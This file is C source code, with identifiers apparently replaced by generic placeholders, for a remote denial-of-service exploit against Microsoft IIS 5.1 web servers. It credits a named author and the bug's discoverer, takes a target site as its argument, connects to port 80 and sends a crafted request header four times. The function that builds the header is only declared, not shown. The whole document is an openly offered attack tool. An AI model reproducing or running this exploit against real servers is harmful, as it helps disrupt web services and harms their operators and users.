
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_zero; int sin_port; int sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int WSADATA ;
typedef int SOCKET ;


 int VAR_0 ;
 char* FUNC_0 (char*) ;
 int VAR_1 ;
 int FUNC_1 () ;
 scalar_t__ FUNC_2 (int,int *) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,struct sockaddr*,int) ;
 int FUNC_5 (int ,char*,...) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int *,int ,int ) ;
 int FUNC_11 (int *,char,int) ;
 int FUNC_12 (int,char*,int ,int ) ;
 int FUNC_13 (int ,int ,int ) ;
 int VAR_2 ;
 int VAR_3 ;

int FUNC_14(int VAR_4, char *VAR_5[])
{
       FUNC_5(VAR_3, "\n\nMicrosoft IIS 5.1 Remote D.o.S Exploit by Kozan\n"
                                       "Bug Discovered by: Inge Henriksen\n"
                                       "Exploit Coded by: Kozan\n"
                                       "Credits to ATmaCA, Inge Henriksen\n"
                                       "www.spyinstructors.com - kozan@spyinstructors.com\n\n"
                       );

       if( VAR_4 != 2 )
       {
               FUNC_5(VAR_2, "\n\nUsage:\t%s [WebSiteUrl]\n\n", VAR_5[0]);
               return -1;
       }

       WSADATA VAR_6;
       struct hostent *VAR_7;
       struct sockaddr_in VAR_8;
       SOCKET VAR_9;

       char VAR_10[1000], VAR_11[1000];

       FUNC_8(VAR_11, VAR_5[1]);
       FUNC_8(VAR_10, FUNC_0(VAR_11));

       if( FUNC_2(0x0101,&VAR_6) < 0 )
       {
               FUNC_5(VAR_2, "Winsock error!\n");
               return -1;
       }

       VAR_9 = FUNC_13(VAR_0,VAR_1,0);

       if( VAR_9 == -1 )
       {
               FUNC_5(VAR_2, "Socket error!\n");
               return -1;
       }

       if( (VAR_7 = FUNC_6(VAR_11)) == ((void*)0) )
       {
               FUNC_5(VAR_2, "Address resolve error!\n");
               return -1;
       }

       FUNC_10(&VAR_8.sin_addr.s_addr, VAR_7->h_addr, VAR_7->h_length);
       VAR_8.sin_family = VAR_0;
       VAR_8.sin_port = FUNC_7(80);
       FUNC_11(&(VAR_8.sin_zero), '\0', 8);

       FUNC_5(VAR_3, "Please wait while connecting...\n");

       if( FUNC_4( VAR_9, (struct sockaddr*)&VAR_8, sizeof(struct sockaddr) ) == -1 )
       {
               FUNC_5(VAR_2, "Connection failed!\n");
               FUNC_3(VAR_9);
               return -1;
       }

       FUNC_5(VAR_3, "Connected.\n\n");

       FUNC_5(VAR_3, "Please wait while sending DoS request headers...\n\n");

       for( int VAR_12=0; VAR_12<4; VAR_12++ )
       {
               FUNC_5(VAR_3, "Sending %d. request...\n", VAR_12+1);

               if( FUNC_12(VAR_9, VAR_10, FUNC_9(VAR_10),0) == -1 )
               {
                       FUNC_5(VAR_2, "%d. DoS request header could not sent!\n", VAR_12+1);
                       FUNC_3(VAR_9);
                       return -1;
               }

               FUNC_5(VAR_3, "%d. request sent.\n\n", VAR_12+1);
       }

       FUNC_5(VAR_3, "Operation completed...\n");
       FUNC_3(VAR_9);
       FUNC_1();


       return 0;
}
